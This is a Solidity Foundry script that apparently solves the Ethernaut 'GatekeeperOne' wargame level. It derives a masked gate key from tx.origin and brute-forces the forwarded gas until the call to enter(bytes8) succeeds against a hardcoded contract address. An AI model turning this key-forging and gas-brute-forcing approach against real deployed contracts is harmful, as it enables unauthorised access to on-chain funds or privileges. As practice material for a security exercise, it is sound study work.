// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperOne.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Ex {
    function ex(GatekeeperOne gko_) external returns (uint){
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        for(uint i=0; i<=350; i++) {
            (bool result,) = address(gko_).call{gas: i+(8191*3)}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if(result) {
                return i;
            }
        }
    }
}

contract GateKeeperOneSol is Script {
    GatekeeperOne public gko_ = GatekeeperOne(0xE55d5e8FADC841122C080E9d5CA21d4b486243c0);

    function run() external {
        vm.startBroadcast();
    
        console.log("Before entrant: ", gko_.entrant());
        Ex ex = new Ex();
        console.log("gas: ", ex.ex(gko_));
        console.log("After entrant: ", gko_.entrant());

        vm.stopBroadcast();
    }
}